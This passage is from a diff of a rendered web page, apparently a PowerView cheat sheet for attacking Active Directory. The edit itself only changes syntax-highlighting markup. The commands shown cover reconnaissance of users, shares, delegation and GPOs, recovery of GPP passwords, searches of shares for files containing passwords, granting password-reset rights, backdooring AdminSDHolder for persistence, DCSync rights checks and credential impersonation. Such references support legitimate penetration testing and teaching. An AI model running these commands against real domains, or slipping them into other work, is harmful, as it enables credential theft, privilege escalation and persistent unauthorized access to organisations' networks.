-<div class="language-text highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>Get-NetLocalGroupMember -ComputerName WS01 -GroupName &quot;Administrators&quot;
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a><span class="nb">Get-NetLocalGroupMember</span> <span class="n">-ComputerName</span> <span class="n">WS01</span> <span class="n">-GroupName</span> <span class="s2">&quot;Administrators&quot;</span>
 </span></code></pre></div>
 - Faster local group member enumeration via Win32 API.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a>Get-NetLocalGroupMember -Method API -ComputerName SERVER.domain.local
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a><span class="nb">Get-NetLocalGroupMember</span> <span class="n">-Method</span> <span class="n">API</span> <span class="n">-ComputerName</span> <span class="n">SERVER</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span>
 </span></code></pre></div>
 - Enumerate shares on a host.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a>Get-NetShare -ComputerName SQL01
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a><span class="nb">Get-NetShare</span> <span class="n">-ComputerName</span> <span class="n">SQL01</span>
 </span></code></pre></div></p>
 <p>User hunting (old Invoke-UserHunter)
 - Show all user locations across domain (be noisy).
-<div class="language-text highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a>Find-DomainUserLocation -ShowAll
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a><span class="nb">Find-DomainUserLocation</span> <span class="n">-ShowAll</span>
 </span></code></pre></div>
 - Focus on unconstrained delegation computers and show users.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a>Find-DomainUserLocation -ComputerUnconstrained -ShowAll
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a><span class="nb">Find-DomainUserLocation</span> <span class="n">-ComputerUnconstrained</span> <span class="n">-ShowAll</span>
 </span></code></pre></div>
 - Hunt for admin users who allow delegation on unconstrained hosts.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a>Find-DomainUserLocation -ComputerUnconstrained -UserAdminCount -UserAllowDelegation
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a><span class="nb">Find-DomainUserLocation</span> <span class="n">-ComputerUnconstrained</span> <span class="n">-UserAdminCount</span> <span class="n">-UserAllowDelegation</span>
 </span></code></pre></div>
 - Hunt specific user and check if you have local admin where found.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a>Find-DomainUserLocation -UserIdentity &quot;jdoe&quot; -CheckAccess
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a><span class="nb">Find-DomainUserLocation</span> <span class="n">-UserIdentity</span> <span class="s2">&quot;jdoe&quot;</span> <span class="n">-CheckAccess</span>
 </span></code></pre></div>
 - Get logged-on users for all “server” OUs in a domain.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a>Get-DomainOU -Identity *server* -Domain corp.local | % { Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname | % { Get-NetLoggedOn -ComputerName $_.dnshostname } }
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a><span class="nb">Get-DomainOU</span> <span class="n">-Identity</span> <span class="p">*</span><span class="n">server</span><span class="p">*</span> <span class="n">-Domain</span> <span class="n">corp</span><span class="p">.</span><span class="n">local</span> <span class="p">|</span> <span class="p">%</span> <span class="p">{</span> <span class="nb">Get-DomainComputer</span> <span class="n">-SearchBase</span> <span class="nv">$_</span><span class="p">.</span><span class="n">distinguishedname</span> <span class="n">-Properties</span> <span class="n">dnshostname</span> <span class="p">|</span> <span class="p">%</span> <span class="p">{</span> <span class="nb">Get-NetLoggedOn</span> <span class="n">-ComputerName</span> <span class="nv">$_</span><span class="p">.</span><span class="n">dnshostname</span> <span class="p">}</span> <span class="p">}</span>
 </span></code></pre></div></p>
 <p>Shares and file discovery
 - Enumerate open shares domain-wide.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a>Find-DomainShare
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a><span class="nb">Find-DomainShare</span>
 </span></code></pre></div>
 - Enumerate only shares you can read.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a>Find-DomainShare -CheckShareAccess
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a><span class="nb">Find-DomainShare</span> <span class="n">-CheckShareAccess</span>
 </span></code></pre></div>
 - Search domain shares for interesting files (old Invoke-FileFinder).
-<div class="language-text highlight"><pre><span></span><code><span id="__span-61-1"><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a>Find-InterestingDomainShareFile -Domain CORP
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-61-1"><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a><span class="nb">Find-InterestingDomainShareFile</span> <span class="n">-Domain</span> <span class="n">CORP</span>
 </span></code></pre></div>
 - Same, with alternate credentials.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a>$Password=&quot;PASSWORD&quot;|ConvertTo-SecureString -AsPlainText -Force; $Credential=New-Object System.Management.Automation.PSCredential(&quot;CORP\user&quot;,$Password); Find-InterestingDomainShareFile -Domain CORP -Credential $Credential
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a><span class="nv">$Password</span><span class="p">=</span><span class="s2">&quot;PASSWORD&quot;</span><span class="p">|</span><span class="nb">ConvertTo-SecureString</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span><span class="p">;</span> <span class="nv">$Credential</span><span class="p">=</span><span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span><span class="p">(</span><span class="s2">&quot;CORP\user&quot;</span><span class="p">,</span><span class="nv">$Password</span><span class="p">);</span> <span class="nb">Find-InterestingDomainShareFile</span> <span class="n">-Domain</span> <span class="n">CORP</span> <span class="n">-Credential</span> <span class="nv">$Credential</span>
 </span></code></pre></div>
 - Recursively search a specific UNC path for keywords, Office docs, and last-access time.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-63-1"><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a>Find-InterestingFile -Path \\SERVER\Share -Include password,creds,secret -OfficeDocs -LastAccessTime (Get-Date).AddDays(-7)
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-63-1"><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a><span class="nb">Find-InterestingFile</span> <span class="n">-Path</span> <span class="p">\\</span><span class="n">SERVER</span><span class="p">\</span><span class="n">Share</span> <span class="n">-Include</span> <span class="n">password</span><span class="p">,</span><span class="n">creds</span><span class="p">,</span><span class="n">secret</span> <span class="n">-OfficeDocs</span> <span class="n">-LastAccessTime</span> <span class="p">(</span><span class="nb">Get-Date</span><span class="p">).</span><span class="n">AddDays</span><span class="p">(-</span><span class="n">7</span><span class="p">)</span>
 </span></code></pre></div></p>
 <p>GPOs, GP links, access mapping
 - List all GPOs in the domain.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-64-1"><a id="__codelineno-64-1" name="__codelineno-64-1" href="#__codelineno-64-1"></a>Get-DomainGPO
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-64-1"><a id="__codelineno-64-1" name="__codelineno-64-1" href="#__codelineno-64-1"></a><span class="nb">Get-DomainGPO</span>
 </span></code></pre></div>
 - List OUs and their GPO links.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-65-1"><a id="__codelineno-65-1" name="__codelineno-65-1" href="#__codelineno-65-1"></a>Get-DomainOU -GPLink | Select-Object Name,gplink
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-65-1"><a id="__codelineno-65-1" name="__codelineno-65-1" href="#__codelineno-65-1"></a><span class="nb">Get-DomainOU</span> <span class="n">-GPLink</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">Name</span><span class="p">,</span><span class="n">gplink</span>
 </span></code></pre></div>
 - List policies applied to a specific computer.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-66-1"><a id="__codelineno-66-1" name="__codelineno-66-1" href="#__codelineno-66-1"></a>Get-DomainGPO -ComputerIdentity WS01.corp.local
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-66-1"><a id="__codelineno-66-1" name="__codelineno-66-1" href="#__codelineno-66-1"></a><span class="nb">Get-DomainGPO</span> <span class="n">-ComputerIdentity</span> <span class="n">WS01</span><span class="p">.</span><span class="n">corp</span><span class="p">.</span><span class="n">local</span>
 </span></code></pre></div>
 - Map where a user/group has local group rights via GPO (old Find-GPOLocation).
-<div class="language-text highlight"><pre><span></span><code><span id="__span-67-1"><a id="__codelineno-67-1" name="__codelineno-67-1" href="#__codelineno-67-1"></a>Get-DomainGPOUserLocalGroupMapping -Identity &quot;CORP\Helpdesk&quot;
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-67-1"><a id="__codelineno-67-1" name="__codelineno-67-1" href="#__codelineno-67-1"></a><span class="nb">Get-DomainGPOUserLocalGroupMapping</span> <span class="n">-Identity</span> <span class="s2">&quot;CORP\Helpdesk&quot;</span>
 </span></code></pre></div>
 - Check RDP group mapping for a user in a domain.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-68-1"><a id="__codelineno-68-1" name="__codelineno-68-1" href="#__codelineno-68-1"></a>Get-DomainGPOUserLocalGroupMapping -Identity &quot;CORP\user&quot; -Domain corp.local -LocalGroup RDP
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-68-1"><a id="__codelineno-68-1" name="__codelineno-68-1" href="#__codelineno-68-1"></a><span class="nb">Get-DomainGPOUserLocalGroupMapping</span> <span class="n">-Identity</span> <span class="s2">&quot;CORP\user&quot;</span> <span class="n">-Domain</span> <span class="n">corp</span><span class="p">.</span><span class="n">local</span> <span class="n">-LocalGroup</span> <span class="n">RDP</span>
 </span></code></pre></div>
 - Export a CSV of GPO mappings with flattened computer arrays.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-69-1"><a id="__codelineno-69-1" name="__codelineno-69-1" href="#__codelineno-69-1"></a>Get-DomainGPOUserLocalGroupMapping | % { $_.computers = ($_.computers -join &quot;, &quot;); $_ } | Export-Csv -NoTypeInformation gpo_map.csv
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-69-1"><a id="__codelineno-69-1" name="__codelineno-69-1" href="#__codelineno-69-1"></a><span class="nb">Get-DomainGPOUserLocalGroupMapping</span> <span class="p">|</span> <span class="p">%</span> <span class="p">{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">computers</span> <span class="p">=</span> <span class="p">(</span><span class="nv">$_</span><span class="p">.</span><span class="n">computers</span> <span class="n">-join</span> <span class="s2">&quot;, &quot;</span><span class="p">);</span> <span class="nv">$_</span> <span class="p">}</span> <span class="p">|</span> <span class="nb">Export-Csv</span> <span class="n">-NoTypeInformation</span> <span class="n">gpo_map</span><span class="p">.</span><span class="n">csv</span>
 </span></code></pre></div></p>
 <p>Delegation reconnaissance
 - Users with constrained delegation configured.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-70-1"><a id="__codelineno-70-1" name="__codelineno-70-1" href="#__codelineno-70-1"></a>Get-DomainUser -TrustedToAuth
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-70-1"><a id="__codelineno-70-1" name="__codelineno-70-1" href="#__codelineno-70-1"></a><span class="nb">Get-DomainUser</span> <span class="n">-TrustedToAuth</span>
 </span></code></pre></div>
 - Computers with constrained delegation configured.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-71-1"><a id="__codelineno-71-1" name="__codelineno-71-1" href="#__codelineno-71-1"></a>Get-DomainComputer -TrustedToAuth
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-71-1"><a id="__codelineno-71-1" name="__codelineno-71-1" href="#__codelineno-71-1"></a><span class="nb">Get-DomainComputer</span> <span class="n">-TrustedToAuth</span>
 </span></code></pre></div>
 - Admin-protected users who are allowed to be delegated (interesting).
-<div class="language-text highlight"><pre><span></span><code><span id="__span-72-1"><a id="__codelineno-72-1" name="__codelineno-72-1" href="#__codelineno-72-1"></a>Get-DomainUser -AllowDelegation -AdminCount
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-72-1"><a id="__codelineno-72-1" name="__codelineno-72-1" href="#__codelineno-72-1"></a><span class="nb">Get-DomainUser</span> <span class="n">-AllowDelegation</span> <span class="n">-AdminCount</span>
 </span></code></pre></div></p>
 <p>ACLs, DCSync rights, AdminSDHolder, backdooring
 - Enumerate who has rights over a target object (resolve GUIDs).
-<div class="language-text highlight"><pre><span></span><code><span id="__span-73-1"><a id="__codelineno-73-1" name="__codelineno-73-1" href="#__codelineno-73-1"></a>Get-DomainObjectAcl -Identity matt -ResolveGUIDs -Domain testlab.local
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-73-1"><a id="__codelineno-73-1" name="__codelineno-73-1" href="#__codelineno-73-1"></a><span class="nb">Get-DomainObjectAcl</span> <span class="n">-Identity</span> <span class="n">matt</span> <span class="n">-ResolveGUIDs</span> <span class="n">-Domain</span> <span class="n">testlab</span><span class="p">.</span><span class="n">local</span>
 </span></code></pre></div>
 - Grant “will” the right to reset “matt”’s password.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-74-1"><a id="__codelineno-74-1" name="__codelineno-74-1" href="#__codelineno-74-1"></a>Add-DomainObjectAcl -TargetIdentity matt -PrincipalIdentity will -Rights ResetPassword -Verbose
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-74-1"><a id="__codelineno-74-1" name="__codelineno-74-1" href="#__codelineno-74-1"></a><span class="nb">Add-DomainObjectAcl</span> <span class="n">-TargetIdentity</span> <span class="n">matt</span> <span class="n">-PrincipalIdentity</span> <span class="n">will</span> <span class="n">-Rights</span> <span class="n">ResetPassword</span> <span class="n">-Verbose</span>
 </span></code></pre></div>
 - Read AdminSDHolder permissions (resolve GUIDs).
-<div class="language-text highlight"><pre><span></span><code><span id="__span-75-1"><a id="__codelineno-75-1" name="__codelineno-75-1" href="#__codelineno-75-1"></a>Get-DomainObjectAcl -SearchBase &#39;CN=AdminSDHolder,CN=System,DC=testlab,DC=local&#39; -ResolveGUIDs
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-75-1"><a id="__codelineno-75-1" name="__codelineno-75-1" href="#__codelineno-75-1"></a><span class="nb">Get-DomainObjectAcl</span> <span class="n">-SearchBase</span> <span class="s1">&#39;CN=AdminSDHolder,CN=System,DC=testlab,DC=local&#39;</span> <span class="n">-ResolveGUIDs</span>
 </span></code></pre></div>
 - Backdoor AdminSDHolder to grant “matt” full rights to protected objects.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-76-1"><a id="__codelineno-76-1" name="__codelineno-76-1" href="#__codelineno-76-1"></a>Add-DomainObjectAcl -TargetIdentity &#39;CN=AdminSDHolder,CN=System,DC=testlab,DC=local&#39; -PrincipalIdentity matt -Rights All
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-76-1"><a id="__codelineno-76-1" name="__codelineno-76-1" href="#__codelineno-76-1"></a><span class="nb">Add-DomainObjectAcl</span> <span class="n">-TargetIdentity</span> <span class="s1">&#39;CN=AdminSDHolder,CN=System,DC=testlab,DC=local&#39;</span> <span class="n">-PrincipalIdentity</span> <span class="n">matt</span> <span class="n">-Rights</span> <span class="n">All</span>
 </span></code></pre></div>
 - Identify principals with replication (DCSync) or full control (domain DN path).
-<div class="language-text highlight"><pre><span></span><code><span id="__span-77-1"><a id="__codelineno-77-1" name="__codelineno-77-1" href="#__codelineno-77-1"></a>Get-DomainObjectAcl &quot;dc=dev,dc=testlab,dc=local&quot; -ResolveGUIDs | ? { ($_.ObjectType -match &#39;replication-get&#39;) -or ($_.ActiveDirectoryRights -match &#39;GenericAll&#39;) }
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-77-1"><a id="__codelineno-77-1" name="__codelineno-77-1" href="#__codelineno-77-1"></a><span class="nb">Get-DomainObjectAcl</span> <span class="s2">&quot;dc=dev,dc=testlab,dc=local&quot;</span> <span class="n">-ResolveGUIDs</span> <span class="p">|</span> <span class="p">?</span> <span class="p">{</span> <span class="p">(</span><span class="nv">$_</span><span class="p">.</span><span class="n">ObjectType</span> <span class="o">-match</span> <span class="s1">&#39;replication-get&#39;</span><span class="p">)</span> <span class="o">-or</span> <span class="p">(</span><span class="nv">$_</span><span class="p">.</span><span class="n">ActiveDirectoryRights</span> <span class="o">-match</span> <span class="s1">&#39;GenericAll&#39;</span><span class="p">)</span> <span class="p">}</span>
 </span></code></pre></div>
 - Alternative DCSync check using Get-ObjectACL alias/function.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-78-1"><a id="__codelineno-78-1" name="__codelineno-78-1" href="#__codelineno-78-1"></a>Get-ObjectACL &quot;DC=testlab,DC=local&quot; -ResolveGUIDs | ? { ($_.ActiveDirectoryRights -match &#39;GenericAll&#39;) -or ($_.ObjectAceType -match &#39;Replication-Get&#39;) }
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-78-1"><a id="__codelineno-78-1" name="__codelineno-78-1" href="#__codelineno-78-1"></a><span class="nb">Get-ObjectACL</span> <span class="s2">&quot;DC=testlab,DC=local&quot;</span> <span class="n">-ResolveGUIDs</span> <span class="p">|</span> <span class="p">?</span> <span class="p">{</span> <span class="p">(</span><span class="nv">$_</span><span class="p">.</span><span class="n">ActiveDirectoryRights</span> <span class="o">-match</span> <span class="s1">&#39;GenericAll&#39;</span><span class="p">)</span> <span class="o">-or</span> <span class="p">(</span><span class="nv">$_</span><span class="p">.</span><span class="n">ObjectAceType</span> <span class="o">-match</span> <span class="s1">&#39;Replication-Get&#39;</span><span class="p">)</span> <span class="p">}</span>
 </span></code></pre></div></p>
 <p>GPP and GPP-linked computers
 - Recover any stored Group Policy Preferences passwords (legacy).
-<div class="language-text highlight"><pre><span></span><code><span id="__span-79-1"><a id="__codelineno-79-1" name="__codelineno-79-1" href="#__codelineno-79-1"></a>Get-GPPPassword
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-79-1"><a id="__codelineno-79-1" name="__codelineno-79-1" href="#__codelineno-79-1"></a><span class="nb">Get-GPPPassword</span>
 </span></code></pre></div>
 - Resolve all computer DNS hostnames where a given GPP/GPO applies by GUID.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-80-1"><a id="__codelineno-80-1" name="__codelineno-80-1" href="#__codelineno-80-1"></a>Get-DomainOU -GPLink &#39;&lt;GPP_GUID&gt;&#39; | % { Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname }
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-80-1"><a id="__codelineno-80-1" name="__codelineno-80-1" href="#__codelineno-80-1"></a><span class="nb">Get-DomainOU</span> <span class="n">-GPLink</span> <span class="s1">&#39;&lt;GPP_GUID&gt;&#39;</span> <span class="p">|</span> <span class="p">%</span> <span class="p">{</span> <span class="nb">Get-DomainComputer</span> <span class="n">-SearchBase</span> <span class="nv">$_</span><span class="p">.</span><span class="n">distinguishedname</span> <span class="n">-Properties</span> <span class="n">dnshostname</span> <span class="p">}</span>
 </span></code></pre></div></p>
 <p>Interesting ACLs and shadow admins
 - Find interesting domain ACLs (write/owner/DACL rights) and resolve GUIDs.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-81-1"><a id="__codelineno-81-1" name="__codelineno-81-1" href="#__codelineno-81-1"></a>Find-InterestingDomainAcl -ResolveGUIDs
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-81-1"><a id="__codelineno-81-1" name="__codelineno-81-1" href="#__codelineno-81-1"></a><span class="nb">Find-InterestingDomainAcl</span> <span class="n">-ResolveGUIDs</span>
 </span></code></pre></div>
 - Flag GPOs where “user” SIDs (&gt;1000) have modification/control rights.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-82-1"><a id="__codelineno-82-1" name="__codelineno-82-1" href="#__codelineno-82-1"></a>Get-DomainObjectAcl -LDAPFilter &#39;(objectCategory=groupPolicyContainer)&#39; | ? { ($_.SecurityIdentifier -match &#39;^S-1-5-.*-[1-9]\d{3,}$&#39;) -and ($_.ActiveDirectoryRights -match &#39;WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner&#39;) }
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-82-1"><a id="__codelineno-82-1" name="__codelineno-82-1" href="#__codelineno-82-1"></a><span class="nb">Get-DomainObjectAcl</span> <span class="n">-LDAPFilter</span> <span class="s1">&#39;(objectCategory=groupPolicyContainer)&#39;</span> <span class="p">|</span> <span class="p">?</span> <span class="p">{</span> <span class="p">(</span><span class="nv">$_</span><span class="p">.</span><span class="n">SecurityIdentifier</span> <span class="o">-match</span> <span class="s1">&#39;^S-1-5-.*-[1-9]\d{3,}$&#39;</span><span class="p">)</span> <span class="o">-and</span> <span class="p">(</span><span class="nv">$_</span><span class="p">.</span><span class="n">ActiveDirectoryRights</span> <span class="o">-match</span> <span class="s1">&#39;WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner&#39;</span><span class="p">)</span> <span class="p">}</span>
 </span></code></pre></div></p>
 <p>OU, file servers, DNS
 - List organizational units.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-83-1"><a id="__codelineno-83-1" name="__codelineno-83-1" href="#__codelineno-83-1"></a>Get-DomainOU
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-83-1"><a id="__codelineno-83-1" name="__codelineno-83-1" href="#__codelineno-83-1"></a><span class="nb">Get-DomainOU</span>
 </span></code></pre></div>
 - Find likely file servers based on user home/profile/script paths.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-84-1"><a id="__codelineno-84-1" name="__codelineno-84-1" href="#__codelineno-84-1"></a>Get-DomainFileServer
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-84-1"><a id="__codelineno-84-1" name="__codelineno-84-1" href="#__codelineno-84-1"></a><span class="nb">Get-DomainFileServer</span>
 </span></code></pre></div>
 - Enumerate DNS records for a zone (if DNS partition accessible).
-<div class="language-text highlight"><pre><span></span><code><span id="__span-85-1"><a id="__codelineno-85-1" name="__codelineno-85-1" href="#__codelineno-85-1"></a>Get-DomainDNSRecord -Zone corp.local
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-85-1"><a id="__codelineno-85-1" name="__codelineno-85-1" href="#__codelineno-85-1"></a><span class="nb">Get-DomainDNSRecord</span> <span class="n">-Zone</span> <span class="n">corp</span><span class="p">.</span><span class="n">local</span>
 </span></code></pre></div></p>
 <p>Trust-aware foreign membership walk
 - Pull foreignSecurityPrincipal DNs from GC for later correlation.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-86-1"><a id="__codelineno-86-1" name="__codelineno-86-1" href="#__codelineno-86-1"></a>$ForeignUsers = Get-DomainObject -Properties objectsid,distinguishedname -SearchBase &quot;GC://testlab.local&quot; -LDAPFilter &#39;(objectclass=foreignSecurityPrincipal)&#39; | ? {$_.objectsid -match &#39;^S-1-5-.*-[1-9]\d{2,}$&#39;} | Select-Object -ExpandProperty distinguishedname
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-86-1"><a id="__codelineno-86-1" name="__codelineno-86-1" href="#__codelineno-86-1"></a><span class="nv">$ForeignUsers</span> <span class="p">=</span> <span class="nb">Get-DomainObject</span> <span class="n">-Properties</span> <span class="n">objectsid</span><span class="p">,</span><span class="n">distinguishedname</span> <span class="n">-SearchBase</span> <span class="s2">&quot;GC://testlab.local&quot;</span> <span class="n">-LDAPFilter</span> <span class="s1">&#39;(objectclass=foreignSecurityPrincipal)&#39;</span> <span class="p">|</span> <span class="p">?</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">objectsid</span> <span class="o">-match</span> <span class="s1">&#39;^S-1-5-.*-[1-9]\d{2,}$&#39;</span><span class="p">}</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">-ExpandProperty</span> <span class="n">distinguishedname</span>
 </span></code></pre></div>
 - For each referenced domain, enumerate domain-local groups with those members.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-87-1"><a id="__codelineno-87-1" name="__codelineno-87-1" href="#__codelineno-87-1"></a>$Domains=@{}; ForEach($ForeignUser in $ForeignUsers){ $ForeignUserDomain=$ForeignUser.Substring($ForeignUser.IndexOf(&#39;DC=&#39;)) -replace &#39;DC=&#39;,&#39;&#39; -replace &#39;,&#39;,&#39;.&#39;; if(-not $Domains[$ForeignUserDomain]){ $Domains[$ForeignUserDomain]=$True; $Filter=&quot;(|(member=&quot;+($ForeignUsers -join &quot;)(member=&quot;)+&quot;))&quot;; Get-DomainGroup -Domain $ForeignUserDomain -Scope DomainLocal -LDAPFilter $Filter -Properties distinguishedname,member } } | fl
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-87-1"><a id="__codelineno-87-1" name="__codelineno-87-1" href="#__codelineno-87-1"></a><span class="nv">$Domains</span><span class="p">=@{};</span> <span class="k">ForEach</span><span class="p">(</span><span class="nv">$ForeignUser</span> <span class="k">in</span> <span class="nv">$ForeignUsers</span><span class="p">){</span> <span class="nv">$ForeignUserDomain</span><span class="p">=</span><span class="nv">$ForeignUser</span><span class="p">.</span><span class="n">Substring</span><span class="p">(</span><span class="nv">$ForeignUser</span><span class="p">.</span><span class="n">IndexOf</span><span class="p">(</span><span class="s1">&#39;DC=&#39;</span><span class="p">))</span> <span class="o">-replace</span> <span class="s1">&#39;DC=&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span> <span class="o">-replace</span> <span class="s1">&#39;,&#39;</span><span class="p">,</span><span class="s1">&#39;.&#39;</span><span class="p">;</span> <span class="k">if</span><span class="p">(</span><span class="o">-not</span> <span class="nv">$Domains</span><span class="p">[</span><span class="nv">$ForeignUserDomain</span><span class="p">]){</span> <span class="nv">$Domains</span><span class="p">[</span><span class="nv">$ForeignUserDomain</span><span class="p">]=</span><span class="nv">$True</span><span class="p">;</span> <span class="nv">$Filter</span><span class="p">=</span><span class="s2">&quot;(|(member=&quot;</span><span class="p">+(</span><span class="nv">$ForeignUsers</span> <span class="n">-join</span> <span class="s2">&quot;)(member=&quot;</span><span class="p">)+</span><span class="s2">&quot;))&quot;</span><span class="p">;</span> <span class="nb">Get-DomainGroup</span> <span class="n">-Domain</span> <span class="nv">$ForeignUserDomain</span> <span class="n">-Scope</span> <span class="n">DomainLocal</span> <span class="n">-LDAPFilter</span> <span class="nv">$Filter</span> <span class="n">-Properties</span> <span class="n">distinguishedname</span><span class="p">,</span><span class="n">member</span> <span class="p">}</span> <span class="p">}</span> <span class="p">|</span> <span class="nb">fl</span>
 </span></code></pre></div></p>
 <p>User impersonation helpers (STA)
 - Temporarily impersonate a different credential (runas /netonly-like).
-<div class="language-text highlight"><pre><span></span><code><span id="__span-88-1"><a id="__codelineno-88-1" name="__codelineno-88-1" href="#__codelineno-88-1"></a>$SecPassword = ConvertTo-SecureString &#39;Password123!&#39; -AsPlainText -Force; $Cred = New-Object System.Management.Automation.PSCredential(&#39;TESTLAB\dfm.a&#39;,$SecPassword); Invoke-UserImpersonation -Credential $Cred
